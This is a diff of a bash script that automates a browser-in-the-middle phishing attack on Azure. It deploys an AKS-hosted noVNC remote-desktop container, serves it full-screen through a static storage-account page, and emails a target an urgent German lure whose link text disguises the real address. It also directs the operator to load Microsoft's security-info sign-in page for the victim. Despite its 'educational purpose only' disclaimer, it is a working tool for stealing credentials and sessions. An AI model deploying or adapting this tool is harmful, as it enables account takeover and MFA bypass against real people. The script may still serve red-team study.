@@ -1,21 +1,4 @@
-
 #!/bin/bash
-## Author Patrick Binder
-## Version 0.7 BETA
-## Date 2025-01-01
-## Filename azaksmail.sh
-
-############################################################
-#                   Azure Web App Deployment Tool           #
-############################################################
-
-
-# Exit on error
-set -e
-
-############################################################
-#                   Colorful Echo Function                 #
-############################################################
 display_message() {
     local message="$1"
     local color="$2"
@@ -29,20 +12,16 @@ display_message() {
         *)      echo "$message" ;;
     esac
 }
-############################################################
-#                   Azure Portal Failsafe                  #
-############################################################
+
 check_azure_cloud_shell() {
     local os_name
     local hostname
     local kernel_version
 
-    # Extract relevant system details
     os_name=$(grep -E '^PRETTY_NAME=' /etc/os-release | cut -d= -f2 | tr -d '"')
     hostname=$(cat /etc/hostname)
     kernel_version=$(uname -a)
 
-    # Check for known Azure Cloud Shell indicators
     if [[ "$os_name" == *"CBL-Mariner"* ]] && [[ "$hostname" == SandboxHost-* ]] && [[ "$kernel_version" == *"microsoft-standard"* ]]; then
         display_message "Script is running in Azure Cloud Shell. Proceeding..." "green"
     else
@@ -50,9 +29,7 @@ check_azure_cloud_shell() {
         exit 1
     fi
 }
-############################################################
-#                   Fancy Banner Introduction              #
-############################################################
+
 display_banner() {
     display_message "##############################  v07 BETA  ##################################" "cyan"
     display_message "#     ___ _____      ___    __ _______    _____ ____  ____  ____  ______   #" "cyan"
@@ -66,11 +43,6 @@ display_banner() {
     display_message "############################################################################" "cyan"
 }
 
-
-
-############################################################
-#                      Send Email Function                 #
-############################################################
 send_email() {
     local smtp_server="$1"
     local to="$2"
@@ -100,9 +72,6 @@ $body
     }
 }
 
-############################################################
-#               Confirm Script Execution                   #
-############################################################
 confirm_execution() {
     echo "Warning: only execute this script from Azure Portal Cloud Shell. This use is for educational purpose only."
     display_message "" "cyan"
@@ -120,9 +89,6 @@ confirm_execution() {
     display_message "" "cyan"
 }
 
-############################################################
-#            Check & Delete Old Resource Groups            #
-############################################################
 check_and_delete_old_resource_groups() {
     local old_groups
     old_groups=$(az group list --query "[?starts_with(name, 'StaticPhishlet')].name" -o tsv)
@@ -134,7 +100,6 @@ check_and_delete_old_resource_groups() {
         if [[ "$delete_confirmation" == "yes" ]]; then
             while read -r group; do
                 display_message "Deleting resource group $group..." "red"
-                # Suppress deletion output
                 az group delete --name "$group" --yes --no-wait >/dev/null 2>&1
             done <<< "$old_groups"
             display_message "All selected resource groups are marked for deletion." "green"
@@ -146,18 +111,10 @@ check_and_delete_old_resource_groups() {
     fi
 }
 
-############################################################
-#                      Main Execution                      #
-############################################################
 main() {
- # Run Azure Cloud Shell Failsafe
     check_azure_cloud_shell
 
-    # -------------------------------------------------------
-    # 1) Parse user-supplied arguments for email parameters
-    #    (SmtpServer, To, From, Subject).
-    # -------------------------------------------------------
-     smtp_server=""
+    smtp_server=""
     recipient=""
     mail_address=""
     subject=""
@@ -196,7 +153,6 @@ main() {
         esac
     done
 
-    # Provide fallback if any argument is missing
     if [[ -z "$smtp_server" ]]; then
         smtp_server="fallbackprefix.mail.protection.outlook.com"
     fi
@@ -216,51 +172,37 @@ main() {
         lastname="Doe"
     fi
 
-    # Show fancy banner
     display_banner
 
-    # Example usage info
     display_message "Example usage: $0 -SmtpServer 'fallback.mail.protection.outlook.com' -To 'helpdesk@fallback.onmicrosoft.com' -From 'helpdesk@fallback.onmicrosoft.com' -Subject 'Test Email' -Firstname 'John' -Lastname 'Doe'" "yellow"
-    # Prompt user
     confirm_execution
 
-    # Generate an SSH key for later use if it doesn't exist
     local ssh_key_name="$HOME/.ssh/az_arc_spoof_id_rsa"
     if [[ ! -f "$ssh_key_name" ]]; then
         display_message "Generating new SSH key at $ssh_key_name..." "blue"
         ssh-keygen -f "$ssh_key_name" -N "" -q
     fi
 
-    # Check Azure login
     if ! az account show &>/dev/null; then
         display_message "Please login to Azure using 'az login'." "red"
         exit 1
     fi
 
-    # Check and delete old resource groups
     check_and_delete_old_resource_groups
 
     local resource_group="StaticPhishlet-RG-$RANDOM"
     local location="eastus"
     local aks_name="rdp-cluster-$RANDOM"
-# Extract the first part from smtp_server for storage account naming
     local smtp_prefix="${smtp_server%%.*}"
-# Ensure the name is lowercase and complies with Azure naming rules (max 24 chars)
     local storage_account_name="$(echo "${smtp_prefix,,}" | tr -cd 'a-z0-9')$RANDOM"
     local index_file="./index.html"
     local public_ip=""
     local email_body=""
-    local index_file="./index.html"
-    local public_ip=""
-    local email_body=""
 
-    # Create Resource Group
     display_message "Creating Resource Group: $resource_group ..." "blue"
     az group create --name "$resource_group" --location "$location" >/dev/null 2>&1
-    
     display_message "Resource Group created: $resource_group" "green"
-    
-    # Create AKS Cluster
+
     display_message "Creating AKS Cluster: $aks_name ..." "blue"
     az aks create \
       --resource-group "$resource_group" \
@@ -271,18 +213,14 @@ main() {
         display_message "Error occurred during AKS creation." "yellow"
         sleep 50
     }
-        
 
     az aks get-credentials --resource-group "$resource_group" --name "$aks_name" >/dev/null 2>&1 || {
         display_message "Failed to retrieve AKS credentials." "yellow"
     }
-    
     display_message "AKS Cluster created: $aks_name" "green"
 
-# Deploy RDP Container
-display_message "Deploying RDP Container..." "blue"
-{
-cat <<EOF > rdp-deployment.yaml
+    display_message "Deploying RDP Container..." "blue"
+    cat <<EOF > rdp-deployment.yaml
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -316,67 +254,46 @@ spec:
       targetPort: 6901
   type: LoadBalancer
 EOF
-}
-# Apply the Kubernetes configuration
-kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1 || {
-    display_message "Failed to apply Kubernetes configuration." "red"
-    exit 1
-}
-# Wait for AKS to assign a public IP
-display_message "Waiting for AKS to assign public IP..." "yellow"
-public_ip=""
-while [[ -z "$public_ip" ]]; do
-    public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
-    sleep 10
-done
 
-display_message "AKS Public IP assigned: $public_ip" "green"
+    kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1 || {
+        display_message "Failed to apply Kubernetes configuration." "red"
+        exit 1
+    }
 
-# Wait for the RDP container to be ready
-display_message "Waiting for RDP container to be ready..." "yellow"
-container_ready=0
-while [[ $container_ready -eq 0 ]]; do
-    if kubectl get pods -l app=rdp -o jsonpath='{.items[0].status.containerStatuses[0].ready}' 2>/dev/null | grep -q "true"; then
-        container_ready=1
-    else
-        display_message "RDP container not ready yet. Waiting for 30 seconds..." "yellow"
-        sleep 30
-    fi
-done
-display_message "RDP container is ready." "green"
+    display_message "Waiting for AKS to assign public IP..." "yellow"
+    while [[ -z "$public_ip" ]]; do
+        public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
+        sleep 10
+    done
+    display_message "AKS Public IP assigned: $public_ip" "green"
 
-sleep 45
+    display_message "Waiting for RDP container to be ready..." "yellow"
+    container_ready=0
+    while [[ $container_ready -eq 0 ]]; do
+        if kubectl get pods -l app=rdp -o jsonpath='{.items[0].status.containerStatuses[0].ready}' 2>/dev/null | grep -q "true"; then
+            container_ready=1
+        else
+            display_message "RDP container not ready yet. Waiting for 30 seconds..." "yellow"
+            sleep 30
+        fi
+    done
+    display_message "RDP container is ready." "green"
 
-# Wait for public IP
-while [[ -z "$public_ip" ]]; do
-    public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
-    sleep 12
-done
-display_message "AKS Public IP assigned: $public_ip" "green"
+    display_message "Creating Storage Account: $storage_account_name ..." "blue"
+    az storage account create --name "$storage_account_name" \
+                              --resource-group "$resource_group" \
+                              --location "$location" \
+                              --sku Standard_LRS \
+                              >/dev/null 2>&1
 
-# Create Storage Account
-display_message "Creating Storage Account: $storage_account_name ..." "blue"
-az storage account create --name "$storage_account_name" \
-                          --resource-group "$resource_group" \
-                          --location "$location" \
-                          --sku Standard_LRS \
-                          >/dev/null 2>&1
+    az storage blob service-properties update \
+       --account-name "$storage_account_name" \
+       --static-website \
+       --index-document "index.html" >/dev/null 2>&1
+    display_message "Storage Account created: $storage_account_name" "green"
 
-az storage blob service-properties update \
-   --account-name "$storage_account_name" \
-   --static-website \
-   --index-document "index.html" >/dev/null 2>&1
-display_message "Storage Account created: $storage_account_name" "green"
-
-# -------------------------------------------------------
-# -------------------------------------------------------
-# ALWAYS recreate index.html, embedding the RDP via iframe
-# -------------------------------------------------------
-# Create index.html with embedded iframe
-
-display_message "Creating index.html with secure iframe..." "blue"
-
-cat <<EOF > "$index_file"
+    display_message "Creating index.html with secure iframe..." "blue"
+    cat <<EOF > "$index_file"
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -400,78 +317,74 @@ cat <<EOF > "$index_file"
     </style>
 </head>
 <body>
-    <iframe src="https://${webapp_url}/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false"></iframe>
+    <iframe src="http://${public_ip}:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false"></iframe>
 </body>
 </html>
 EOF
 
+    az storage blob upload \
+       --account-name "$storage_account_name" \
+       --container-name "\$web" \
+       --name "index.html" \
+       --file "$index_file" >/dev/null 2>&1
 
+    local website_url
+    website_url=$(az storage account show \
+        --name "$storage_account_name" \
+        --resource-group "$resource_group" \
+        --query 'primaryEndpoints.web' \
+        -o tsv)
 
-# Upload index.html to static website container
-az storage blob upload \
-   --account-name "$storage_account_name" \
-   --container-name "\$web" \
-   --name "index.html" \
-   --file "$index_file" >/dev/null 2>&1
-# Retrieve the actual primary web endpoint from Azure
-local website_url
-website_url=$(az storage account show \
-    --name "$storage_account_name" \
-    --resource-group "$resource_group" \
-    --query 'primaryEndpoints.web' \
-    -o tsv)
-# Build HTML email body
-email_body="<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body>"
-email_body+="<p>Hi ${firstname},</p>"
-email_body+="<p>Schau dir das bitte dringend bis heute Abend an!</p>"
-email_body+="<p><a href=\"${website_url}\">https://www.abtis.de/emergency</a></p>"
-email_body+="<p>&nbsp;</p>" 
-email_body+="<p>Grüße</p>"
-email_body+="</body></html>"    
-    # show web Email
-display_message "Email sent successfully to $recipient." "green"
-display_message "" "cyan"
-display_message "############################################" "cyan"
-display_message "RDP is available at: http://${public_ip}:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false" "magenta"
-display_message "Static site redirect link: ${website_url}" "magenta"
-display_message "now navigate to rdp open https://mysignins.microsoft.com/security-info then F11" "cyan"
-display_message "############################################" "cyan"
-sleep 60
-# send mail
-display_message "Sending Email to $recipient ..." "blue"
-send_email "$smtp_server" "$recipient" "$mail_address" "$subject" "$email_body"
+    email_body="<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body>"
+    email_body+="<p>Hi ${firstname},</p>"
+    email_body+="<p>Schau dir das bitte dringend bis heute Abend an!</p>"
+    email_body+="<p><a href=\"${website_url}\">https://www.abtis.de/emergency</a></p>"
+    email_body+="<p>&nbsp;</p>" 
+    email_body+="<p>Grüße</p>"
+    email_body+="</body></html>"
 
-display_message "" "cyan"
-# Ask user about SSH connection
-display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
-read -p "Do you want to optionally connect via SSH to the cluster node? (yes/no): " next_step
-if [[ "$next_step" == "yes" ]]; then
-    display_message "Proceeding with SSH connection attempt." "blue"
-    
-    # Get the node resource group
-    node_resource_group=$(az aks show --resource-group "$resource_group" --name "$aks_name" --query nodeResourceGroup -o tsv)
-    
-    # Get the VMSS name
-    vmss_name=$(az vmss list --resource-group "$node_resource_group" --query "[0].name" -o tsv)
-    
-    # Get the instance ID
-    instance_id=$(az vmss list-instances --resource-group "$node_resource_group" --name "$vmss_name" --query "[0].instanceId" -o tsv)
-    
-    # Get the public IP address of the instance
-    public_ip=$(az vmss list-instance-public-ips --resource-group "$node_resource_group" --name "$vmss_name" --query "[0].ipAddress" -o tsv)
-    
-    # Add the public IP to known hosts
-    ssh-keyscan "$public_ip" >> ~/.ssh/known_hosts 2>/dev/null || true
-    chmod 600 "$ssh_key_name"
-    
-    display_message "Attempting to connect to azureuser@$public_ip ..." "blue"
-    ssh -i "$ssh_key_name" azureuser@"$public_ip" || {
-        display_message "SSH connection failed." "red"
-        exit 1
-    }
-else
-    display_message "Exiting script as per user choice." "green"
-    exit 0
-fi
+    display_message "Email sent successfully to $recipient." "green"
+    display_message "" "cyan"
+    display_message "############################################" "cyan"
+    display_message "RDP is available at: http://${public_ip}:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false" "magenta"
+    display_message "Static site redirect link: ${website_url}" "magenta"
+    display_message "now navigate to rdp open https://mysignins.microsoft.com/security-info then F11" "cyan"
+    display_message "############################################" "cyan"
+    sleep 60
+
+    display_message "Sending Email to $recipient ..." "blue"
+    send_email "$smtp_server" "$recipient" "$mail_address" "$subject" "$email_body"
+
+    display_message "" "cyan"
+    display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
+    read -p "Do you want to optionally connect via SSH to the cluster node? (yes/no): " next_step
+    if [[ "$next_step" == "yes" ]]; then
+        display_message "Proceeding with SSH connection attempt." "blue"
+        
+        local node_resource_group
+        node_resource_group=$(az aks show --resource-group "$resource_group" --name "$aks_name" --query nodeResourceGroup -o tsv)
+        
+        local vmss_name
+        vmss_name=$(az vmss list --resource-group "$node_resource_group" --query "[0].name" -o tsv)
+        
+        local instance_id
+        instance_id=$(az vmss list-instances --resource-group "$node_resource_group" --name "$vmss_name" --query "[0].instanceId" -o tsv)
+        
+        local public_ip
+        public_ip=$(az vmss list-instance-public-ips --resource-group "$node_resource_group" --name "$vmss_name" --query "[0].ipAddress" -o tsv)
+        
+        ssh-keyscan "$public_ip" >> ~/.ssh/known_hosts 2>/dev/null || true
+        chmod 600 "$ssh_key_name"
+        
+        display_message "Attempting to connect to azureuser@$public_ip ..." "blue"
+        ssh -i "$ssh_key_name" azureuser@"$public_ip" || {
+            display_message "SSH connection failed." "red"
+            exit 1
+        }
+    else
+        display_message "Exiting script as per user choice." "green"
+        exit 0
+    fi
 }
+
 main "$@"
